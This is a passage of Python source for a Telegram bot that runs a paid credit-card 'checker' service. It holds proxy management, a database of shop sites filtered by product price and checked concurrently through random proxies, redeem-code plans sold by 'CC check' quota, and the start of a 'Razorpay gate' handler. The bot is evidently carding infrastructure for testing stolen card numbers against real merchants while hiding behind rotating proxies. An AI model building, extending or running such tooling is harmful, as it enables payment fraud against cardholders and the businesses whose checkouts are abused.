    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ Proxy removed!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    indices_str = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Removed {len(removed)} proxies!\n\nRemoved:\n<code>{removed_text}</code>"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/clearproxy(?:\s|$)'))
async def clear_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ proxy.txt is already empty."), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(premium_emoji(f"📦 Backup created!\n\nSending backup of {count} proxies..."), file=backup_filename, parse_mode='html')

        try:
            os.remove(backup_filename)
        except Exception:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ Cleared all {count} proxies!\n\nproxy.txt is now empty."), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/getproxy(?:\s|$)'))
async def get_all_proxies(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"📋 All Proxies ({len(current_proxies)}):\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except Exception:
            pass


@bot.on(events.NewMessage(pattern=r'^/site(?:\s|$)'))
async def site_command(event):
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this."), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ <b>No sites in DB.</b> Use /addsites to add sites."), parse_mode='html')
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Add proxies first."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("⏳ Loading..."), parse_mode='html')

    pending_sitecheck[user_id] = {
        'sites': sites,
        'proxies': proxies,
        'msg_id': status_msg.id,
        'chat_id': event.chat_id,
    }

    filter_text = (
        f"🌐 <b>Site Checker</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 Sites in DB  » <b>{len(sites)}</b>\n"
        f"🔌 Proxies      » <b>{len(proxies)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💰 <b>Select price filter:</b>\n"
        f"Dead sites will be removed from DB.\n"
        f"Alive sites outside the range will also be removed."
    )
    filter_buttons = [
        [
            Button.inline("1 - 5$",            f"sf_{user_id}_1_5".encode(),   style="success"),
            Button.inline("5 - 10$",           f"sf_{user_id}_5_10".encode(),  style="success"),
        ],
        [
            Button.inline("10 - 15$",          f"sf_{user_id}_10_15".encode(), style="success"),
            Button.inline("15 - 20$",          f"sf_{user_id}_15_20".encode(), style="success"),
        ],
        [
            Button.inline("No Filter (keep all alive)", f"sf_{user_id}_0_0".encode(), style="success"),
        ],
    ]
    await status_msg.edit(premium_emoji(filter_text), buttons=filter_buttons, parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"sf_(\d+)_(\d+)_(\d+)"))
async def sitecheck_filter_callback(event):
    match   = event.pattern_match
    cb_uid  = int(match.group(1).decode())
    min_p   = int(match.group(2).decode())
    max_p   = int(match.group(3).decode())
    no_filter = (min_p == 0 and max_p == 0)

    if event.sender_id != cb_uid:
        await event.answer("❌ Not your request.", alert=True)
        return

    state = pending_sitecheck.pop(cb_uid, None)
    if not state:
        await event.answer("❌ Session expired. Run /site again.", alert=True)
        return

    await event.answer(f"✅ Filter: {'None' if no_filter else f'${min_p}–${max_p}'}")

    sites    = state['sites']
    proxies  = state['proxies']
    msg_id   = state['msg_id']
    chat_id  = state['chat_id']
    filter_label = "No Filter" if no_filter else f"${min_p} – ${max_p}"

    await bot.edit_message(
        chat_id, msg_id,
        premium_emoji(
            f"🔄 <b>Checking {len(sites)} sites...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Price filter » <b>{filter_label}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting concurrent check, please wait..."
        ),
        parse_mode='html'
    )

    alive_sites   = []
    filtered_out  = []
    dead_sites    = []
    checked_count = [0]
    lock          = asyncio.Lock()
    sem           = asyncio.Semaphore(50)

    async def check_one(site):
        async with sem:
            proxy = random.choice(proxies)
            return await test_site(site, proxy)

    async def run_all():
        tasks = [check_one(site) for site in sites]
        total = len(tasks)
        for coro in asyncio.as_completed(tasks):
            res = await coro
            async with lock:
                checked_count[0] += 1
                cnt = checked_count[0]

                if res['status'] == 'alive':
                    if no_filter or price_in_range(res['price'], min_p, max_p):
                        alive_sites.append(res['site'])
                    else:
                        filtered_out.append(res['site'])
                else:
                    dead_sites.append(res['site'])

                if cnt % 5 == 0 or cnt == total:
                    try:
                        await bot.edit_message(
                            chat_id, msg_id,
                            premium_emoji(
                                f"🔄 <b>Checking Sites (Parallel)...</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"💰 Filter  » <b>{filter_label}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"📊 Progress » {cnt}/{total}\n"
                                f"✅ Alive    » {len(alive_sites)}\n"
                                f"🚫 Filtered » {len(filtered_out)}\n"
                                f"❌ Dead     » {len(dead_sites)}"
                            ),
                            parse_mode='html'
                        )
                    except Exception:
                        pass

    await run_all()

    # Save only alive (in-range) sites
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in alive_sites:
            await f.write(f"{site}\n")

    removed = len(dead_sites) + len(filtered_out)
    preview = "\n".join([f"  • {s}" for s in alive_sites[:5]])
    if len(alive_sites) > 5:
        preview += f"\n  ... +{len(alive_sites) - 5} more"
    if not preview:
        preview = "  None survived the filter."

    result_text = (
        f"✅ <b>Site Check Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Filter     » {filter_label}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📤 Total      » {len(sites)}\n"
        f"✅ Alive      » {len(alive_sites)}\n"
        f"🚫 Filtered   » {len(filtered_out)}\n"
        f"❌ Dead       » {len(dead_sites)}\n"
        f"🗑️ Removed    » {removed}\n"
        f"📦 DB updated » {len(alive_sites)} sites\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Kept:</b>\n{preview}"
    )
    await bot.edit_message(chat_id, msg_id, premium_emoji(result_text), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied\n\nOnly premium users can use this."), parse_mode='html')
        return

    try:
        url_to_remove = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
        if not url_to_remove:
            await event.reply(premium_emoji("❌ Usage: <code>/rm https://site.com</code>"), parse_mode='html')
            return

        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found: <code>{url_to_remove}</code>"), parse_mode='html')
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ Site removed!\n\n<code>{url_to_remove}</code>"), parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/addsites(?:\s|$)'))
async def add_sites_command(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji(
            "📂 <b>How to use:</b>\n"
            "Reply to a <code>.txt</code> file containing site list, then send <code>/addsites</code>"
        ), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a <code>.txt</code> file."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("⏳ Reading file..."), parse_mode='html')

    try:
        file_path = await reply_msg.download_media()

        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            new_sites = [line.strip() for line in content.splitlines() if line.strip()]

        os.remove(file_path)

        if not new_sites:
            await status_msg.edit(premium_emoji("❌ No valid sites found in file."), parse_mode='html')
            return

        proxies = load_proxies()
        if not proxies:
            await status_msg.edit(premium_emoji("❌ No proxies available to test sites."), parse_mode='html')
            return

        # Store pending state and ask for price filter
        pending_addsites[user_id] = {
            'sites': new_sites,
            'proxies': proxies,
            'msg_id': status_msg.id,
            'chat_id': event.chat_id,
        }

        filter_text = (
            f"📂 <b>Sites file loaded!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 Sites found: <b>{len(new_sites)}</b>\n"
            f"🔌 Proxies:     <b>{len(proxies)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💰 <b>Select a price filter:</b>\n"
            f"Only sites whose product price falls inside\n"
            f"the selected range will be added."
        )

        filter_buttons = [
            [
                Button.inline("1 - 5$",   f"af_{user_id}_1_5".encode(),   style="success"),
                Button.inline("5 - 10$",  f"af_{user_id}_5_10".encode(),  style="success"),
            ],
            [
                Button.inline("10 - 15$", f"af_{user_id}_10_15".encode(), style="success"),
                Button.inline("15 - 20$", f"af_{user_id}_15_20".encode(), style="success"),
            ],
        ]

        await status_msg.edit(premium_emoji(filter_text), buttons=filter_buttons, parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"af_(\d+)_(\d+)_(\d+)"))
async def addsites_filter_callback(event):
    match = event.pattern_match
    cb_user_id = int(match.group(1).decode())
    min_p = int(match.group(2).decode())
    max_p = int(match.group(3).decode())

    # Only the admin who triggered /addsites can press this
    if event.sender_id != cb_user_id:
        await event.answer("❌ Not your request.", alert=True)
        return

    state = pending_addsites.pop(cb_user_id, None)
    if not state:
        await event.answer("❌ Session expired. Run /addsites again.", alert=True)
        return

    await event.answer(f"✅ Filter: ${min_p}–${max_p}")

    new_sites = state['sites']
    proxies   = state['proxies']
    msg_id    = state['msg_id']
    chat_id   = state['chat_id']

    await bot.edit_message(
        chat_id, msg_id,
        premium_emoji(
            f"🔄 <b>Checking {len(new_sites)} sites...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💰 Price filter: <b>${min_p} – ${max_p}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting concurrent check, please wait..."
        ),
        parse_mode='html'
    )

    alive_sites   = []
    filtered_out  = []
    dead_sites    = []
    checked_count = [0]
    lock = asyncio.Lock()

    # Semaphore for max 25 concurrent site checks
    sem = asyncio.Semaphore(25)

    async def check_one(site):
        async with sem:
            proxy = random.choice(proxies)
            return await test_site(site, proxy)

    async def run_all():
        tasks = [check_one(site) for site in new_sites]
        total = len(tasks)

        for coro in asyncio.as_completed(tasks):
            res = await coro
            async with lock:
                checked_count[0] += 1
                cnt = checked_count[0]

                if res['status'] == 'alive':
                    if price_in_range(res['price'], min_p, max_p):
                        alive_sites.append(res['site'])
                    else:
                        filtered_out.append(res['site'])
                else:
                    dead_sites.append(res['site'])

                # Update progress every 5 checks or on last
                if cnt % 5 == 0 or cnt == total:
                    try:
                        await bot.edit_message(
                            chat_id, msg_id,
                            premium_emoji(
                                f"🔄 <b>Checking Sites (Parallel)...</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"💰 Filter: <b>${min_p} – ${max_p}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                f"📊 Progress  » {cnt}/{total}\n"
                                f"✅ Matched   » {len(alive_sites)}\n"
                                f"🚫 Filtered  » {len(filtered_out)}\n"
                                f"❌ Dead      » {len(dead_sites)}"
                            ),
                            parse_mode='html'
                        )
                    except Exception:
                        pass

    await run_all()

    # FIX #2 — MERGE with existing sites
    existing_sites = load_sites()
    merged_sites = list(dict.fromkeys(existing_sites + alive_sites))
    newly_added = len(merged_sites) - len(existing_sites)

    async with aiofiles.open(SITES_FILE, 'w') as f:
        for site in merged_sites:
            await f.write(f"{site}\n")

    added_preview = "\n".join([f"  • {s}" for s in alive_sites[:5]])
    if len(alive_sites) > 5:
        added_preview += f"\n  ... +{len(alive_sites) - 5} more"
    if not added_preview:
        added_preview = "  None matched the price filter."

    result_text = (
        f"✅ <b>Sites Update Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💰 Filter     » ${min_p} – ${max_p}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📤 Received   » {len(new_sites)}\n"
        f"✅ Matched    » {len(alive_sites)}\n"
        f"🚫 Filtered   » {len(filtered_out)}\n"
        f"❌ Dead       » {len(dead_sites)}\n"
        f"➕ New added  » {newly_added}\n"
        f"📦 Total DB   » {len(merged_sites)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 <b>Added:</b>\n{added_preview}"
    )

    await bot.edit_message(chat_id, msg_id, premium_emoji(result_text), parse_mode='html')


# FIX #3 — /getsites handler (was completely missing)
@bot.on(events.NewMessage(pattern=r'^/getsites(?:\s|$)'))
async def get_sites_command(event):
    user_id = event.sender_id

    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    current_sites = load_sites()

    if not current_sites:
        await event.reply(premium_emoji("❌ sites.txt is empty. No sites to download."), parse_mode='html')
        return

    if len(current_sites) <= 20:
        sites_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(current_sites)])
        await event.reply(
            premium_emoji(f"🌐 <b>Sites ({len(current_sites)}):</b>\n\n{sites_list}"),
            parse_mode='html'
        )
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sites_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, site in enumerate(current_sites):
                await f.write(f"{i+1}. {site}\n")

        await event.reply(
            premium_emoji(f"🌐 <b>Sites ({len(current_sites)})</b>\n\nFile attached below."),
            file=filename,
            parse_mode='html'
        )

        try:
            os.remove(filename)
        except Exception:
            pass


@bot.on(events.NewMessage(pattern=r'^/listusers(?:\s|$)'))
async def list_users_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    users = load_users_data()
    if not users:
        await event.reply(premium_emoji("📭 No active users found."), parse_mode='html')
        return

    now = datetime.now()
    lines = []
    active = 0
    for uid, data in users.items():
        try:
            exp = datetime.fromisoformat(data['expires_at'])
            status = "✅" if now < exp else "❌"
            if now < exp:
                active += 1
            plan_key = data.get('plan', '?')
            plan = PLANS.get(plan_key, {})
            emoji = plan.get('emoji', '💎')
            cc_used  = data.get('cc_used', 0)
            cc_limit = data.get('cc_limit', 0)
            exp_str  = exp.strftime("%d %b %Y")
            lines.append(f"{status} <code>{uid}</code>  {emoji} {plan_key}  {cc_used}/{cc_limit}  exp {exp_str}")
        except Exception:
            lines.append(f"⚠️ <code>{uid}</code>  (corrupt)")

    header = f"👥 <b>Users ({active} active / {len(users)} total)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    await event.reply(premium_emoji(header + "\n".join(lines)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/listcodes(?:\s|$)'))
async def list_codes_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    codes = load_codes()
    if not codes:
        await event.reply(premium_emoji("📭 No codes generated yet."), parse_mode='html')
        return

    unused = [(c, d) for c, d in codes.items() if not d['used']]
    used   = [(c, d) for c, d in codes.items() if d['used']]

    lines = [f"🎟️ <b>Redeem Codes</b>  ({len(unused)} unused / {len(codes)} total)\n━━━━━━━━━━━━━━━━━━━━━━"]
    if unused:
        lines.append("\n<b>✅ Unused:</b>")
        for code, data in unused[-20:]:
            plan = PLANS.get(data['plan'], {})
            lines.append(f"  {plan.get('emoji','💎')} <code>{code}</code>  {data['plan']}")
    if used:
        lines.append(f"\n<b>❌ Used ({len(used)}):</b>")
        for code, data in used[-10:]:
            lines.append(f"  <code>{code}</code> → {data.get('used_by','?')}")

    await event.reply(premium_emoji("\n".join(lines)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/stats(?:\s|$)'))
async def stats_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Access Denied. Admin only."), parse_mode='html')
        return

    users  = load_users_data()
    codes  = load_codes()
    sites  = load_sites()
    proxies = load_proxies()
    now    = datetime.now()
    active = 0
    for d in users.values():
        try:
            if now < datetime.fromisoformat(d.get('expires_at', '2000-01-01')):
                active += 1
        except Exception:
            pass
    unused_codes = sum(1 for d in codes.values() if not d['used'])

    stats_text = (
        f"📊 <b>Bot Statistics</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Admins          » {len(ADMIN_ID)}\n"
        f"💎 Active users    » {active}\n"
        f"🎟️ Unused codes    » {unused_codes}\n"
        f"🌐 Sites           » {len(sites)}\n"
        f"🔌 Proxies         » {len(proxies)}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot Status      » Running ✅"
    )
    await event.reply(premium_emoji(stats_text), parse_mode='html')


# ─── GENCODE INLINE CALLBACK ─────────────────────────────────────────────────

@bot.on(events.CallbackQuery(pattern=rb"gencode_(\w+)"))
async def gencode_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Admin only.", alert=True)
        return

    plan_key = event.pattern_match.group(1).decode().upper()
    if plan_key not in PLANS:
        await event.answer("❌ Invalid plan.", alert=True)
        return

    plan = PLANS[plan_key]
    prompt = (
        f"<b>Generate {plan_key} Code</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Plan   » <b>{plan_key}</b>\n"
        f"Days   » {plan['days']} day{'s' if plan['days'] > 1 else ''}\n"
        f"Limit  » {plan['cc_limit']} CC checks\n"
        f"Price  » {plan['price']}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"How many codes to generate?"
    )
    buttons = [
        [
            Button.inline("1",  f"gencount_{plan_key}_1".encode(),  style="success"),
            Button.inline("3",  f"gencount_{plan_key}_3".encode(),  style="success"),
            Button.inline("5",  f"gencount_{plan_key}_5".encode(),  style="success"),
        ],
        [
            Button.inline("10", f"gencount_{plan_key}_10".encode(), style="success"),
            Button.inline("20", f"gencount_{plan_key}_20".encode(), style="success"),
            Button.inline("50", f"gencount_{plan_key}_50".encode(), style="success"),
        ],
        [Button.inline("Back", b"admin_panel", style="danger")],
    ]
    await event.edit(premium_emoji(prompt), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"gencount_(\w+)_(\d+)"))
async def gencount_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Admin only.", alert=True)
        return

    plan_key = event.pattern_match.group(1).decode().upper()
    count    = int(event.pattern_match.group(2).decode())

    if plan_key not in PLANS:
        await event.answer("❌ Invalid plan.", alert=True)
        return

    plan  = PLANS[plan_key]
    codes = [generate_code(plan_key) for _ in range(count)]

    if count == 1:
        code = codes[0]
        msg = (
            f"<b>Code Generated!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Plan   » <b>{plan_key}</b>\n"
            f"Code   » <code>{code}</code>\n"
            f"Days   » {plan['days']} day{'s' if plan['days'] > 1 else ''}\n"
            f"Limit  » {plan['cc_limit']} CC checks\n"
            f"Price  » {plan['price']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Activate: <code>/redeem {code}</code>"
        )
    else:
        codes_text = "\n".join(f"  <code>{c}</code>" for c in codes)
        msg = (
            f"<b>{count} {plan_key} Codes Generated!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Plan   » <b>{plan_key}</b>\n"
            f"Days   » {plan['days']} day{'s' if plan['days'] > 1 else ''}\n"
            f"Limit  » {plan['cc_limit']} CC checks\n"
            f"Price  » {plan['price']}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Codes:</b>\n{codes_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Activate with: <code>/redeem CODE</code>"
        )

    await event.answer(f"✅ {count} {plan_key} code{'s' if count > 1 else ''} generated!")
    await bot.send_message(user_id, premium_emoji(msg), parse_mode='html')


# ─── /plan ───────────────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/plan(?:\s|$)'))
async def plan_command(event):
    plan_text = (
        "💎 <b>CHECKER PLANS</b> 💎\n\n"
        f"🆓 <b>FREE</b>\n"
        f"💰 Free  |  ⏳ 30 Days  |  📊 100 CC Limit\n"
        f"🏠 Group checking only\n\n"
        f"🥉 <b>BASIC</b>\n"
        f"💰 $1  |  ⏳ 1 Day  |  📊 500 CC Limit\n\n"
        f"🥈 <b>STANDARD</b>\n"
        f"💰 $2  |  ⏳ 5 Days  |  📊 1000 CC Limit\n\n"
        f"🥇 <b>PREMIUM</b>\n"
        f"💰 $7  |  ⏳ 15 Days  |  📊 2000 CC Limit\n\n"
        f"👑 <b>VIP</b>\n"
        f"💰 $15  |  ⏳ 30 Days  |  📊 5000 CC Limit\n\n"
        f"━━━━━━━━━━━━━━\n"
        f"⚡ Fast Checking\n"
        f"⚡ Stable Access\n"
        f"⚡ Regular Updates\n"
        f"━━━━━━━━━━━━━━\n"
        f"DM : @UNTAMEDU"
    )
    buttons = [
        [Button.url("💬 DM @UNTAMEDU", "https://t.me/UNTAMEDU"),
         Button.url("🏠 Free Group",   GROUP_LINK)],
    ]
    await event.reply(premium_emoji(plan_text), buttons=buttons, parse_mode='html')


# ─── /redeem ─────────────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/redeem(?:\s|$)'))
async def redeem_command(event):
    user_id = event.sender_id
    text = event.message.text.split(None, 1)

    if len(text) < 2 or not text[1].strip():
        await event.reply(premium_emoji(
            "🔑 <b>Redeem a Code</b>\n\n"
            "Usage: <code>/redeem YOUR-CODE-HERE</code>\n\n"
            "💡 Don't have a code? Use /plan to see our plans\n"
            "   and DM @AYYANOXD to purchase."
        ), parse_mode='html')
        return

    code = text[1].strip()
    status, info = redeem_code(user_id, code)

    if status == 'not_found':
        await event.reply(premium_emoji(
            "❌ <b>Invalid Code</b>\n\n"
            "This code doesn't exist. Check and try again.\n"
            "💡 Use /plan to purchase a valid code."
        ), parse_mode='html')
        return

    if status == 'already_active':
        await event.reply(premium_emoji(
            "🚫━━━━━━━━━━━━━━━━━━━━━━🚫\n"
            "   ACTIVE PLAN ALREADY EXISTS\n"
            "🚫━━━━━━━━━━━━━━━━━━━━━━🚫\n\n"
            "👤 You already have an active plan.\n\n"
            "⏳ You can redeem a **new code** only after your current plan **expires**.\n\n"
            "💡 Use /myplan to check your current plan status.\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        ), parse_mode='html')
        return

    if status == 'used':
        await event.reply(premium_emoji(
            "❌ <b>Code Already Used</b>\n\n"
            "This code has already been redeemed.\n"
            "💡 Use /plan to purchase a new code."
        ), parse_mode='html')
        return

    plan     = info['plan']
    plan_key = info['plan_key']
    exp      = info['expires_at']
    exp_str  = exp.strftime("%d %b %Y, %H:%M")

    success_msg = (
        f"🎉 <b>Code Redeemed!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{plan['emoji']} Plan     » <b>{plan_key}</b>\n"
        f"⏳ Expires  » {exp_str}\n"
        f"📊 CC Limit » {plan['cc_limit']} checks\n"
        f"💰 Price    » {plan['price']}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"You're all set! Start checking:\n"
        f"  💳 <code>/cc card|mm|yy|cvv</code>\n"
        f"  📂 <code>/chk</code> — reply to .txt"
    )
    await event.reply(premium_emoji(success_msg), parse_mode='html')


# ─── /myplan ─────────────────────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/myplan(?:\s|$)'))
async def myplan_command(event):
    user_id = event.sender_id

    if user_id in ADMIN_ID:
        await event.reply(premium_emoji(
            "👑 <b>Your Plan: ADMIN</b>\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⚡ You have full admin privileges\n"
            "✅ Unlimited CC checks\n"
            "✅ Access to all features\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "This is not a redeemable plan."
        ), parse_mode='html')
        return

    users = load_users_data()
    uid   = str(user_id)

    if uid not in users:
        await event.reply(premium_emoji(
            "❌ <b>No Active Plan</b>\n\n"
            "You don't have an active plan.\n"
            "💡 Use /plan to see available plans.\n"
            "💡 Use /redeem CODE to activate one."
        ), parse_mode='html')
        return

    data     = users[uid]
    plan_key = data.get('plan', '?')
    plan     = PLANS.get(plan_key, {})
    try:
        exp = datetime.fromisoformat(data['expires_at'])
        now = datetime.now()
        if now >= exp:
            await event.reply(premium_emoji(
                f"⏰ <b>Plan Expired</b>\n\n"
                f"{plan.get('emoji','💎')} {plan_key} plan expired on {exp.strftime('%d %b %Y')}\n\n"
                "💡 Use /plan to purchase a new plan."
            ), parse_mode='html')
            return
        days_left = (exp - now).days
        exp_str   = exp.strftime("%d %b %Y, %H:%M")
        cc_used   = data.get('cc_used', 0)
        cc_limit  = data.get('cc_limit', plan.get('cc_limit', 0))
        cc_left   = max(0, cc_limit - cc_used)

        msg = (
            f"💎 <b>Your Active Plan</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{plan.get('emoji','💎')} Plan     » <b>{plan_key}</b>\n"
            f"⏳ Expires  » {exp_str}\n"
            f"📅 Days left » {days_left} day{'s' if days_left != 1 else ''}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 CC Used  » {cc_used}/{cc_limit}\n"
            f"✅ CC Left  » {cc_left}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        await event.reply(premium_emoji(msg), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error reading plan: {e}"), parse_mode='html')


# ─── RAZORPAY SINGLE CHECK ───────────────────────────────────────────────────

@bot.on(events.NewMessage(pattern=r'^/rz\s+'))
async def rz_command(event):
    user_id = event.sender_id

    # Razorpay gate: PREMIUM and VIP only
    if user_id not in ADMIN_ID:
        u_plan = load_users_data().get(str(user_id), {}).get('plan', 'FREE')
        if u_plan not in ('PREMIUM', 'VIP'):
            await event.reply(premium_emoji(
                "🥇 <b>PREMIUM / VIP Only</b>\n\n"
                "The Razorpay gate is restricted to\n"
                "<b>🥇 PREMIUM</b> and <b>👑 VIP</b> plan users.\n\n"
                "💡 Upgrade your plan: /plan"
            ), parse_mode='html')
            return

    check_status = can_check(user_id, event.is_private)
    if check_status == 'no_plan':
        await event.reply(premium_emoji(
            "❌ <b>No Plan Found</b>\n\nUse /plan to see plans\nUse /redeem CODE to activate"
        ), parse_mode='html')
